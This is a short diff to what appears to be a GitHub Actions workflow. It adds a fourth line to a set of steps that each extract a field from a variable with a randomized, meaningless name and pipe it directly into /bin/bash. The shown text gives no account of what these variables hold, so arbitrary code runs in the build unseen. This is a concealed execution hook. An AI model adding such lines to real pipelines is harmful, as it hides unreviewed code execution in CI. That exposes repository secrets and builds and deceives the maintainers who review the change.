@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$yhw28892" | jq -r .u594 | /bin/bash
           echo $zfrbf06610 | jq -r .xjjcf82 | /bin/bash
           printf '%s' "$lz8" | jq -r .stjrj715 | /bin/bash
+          echo $w5 | jq -r .idmj151 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
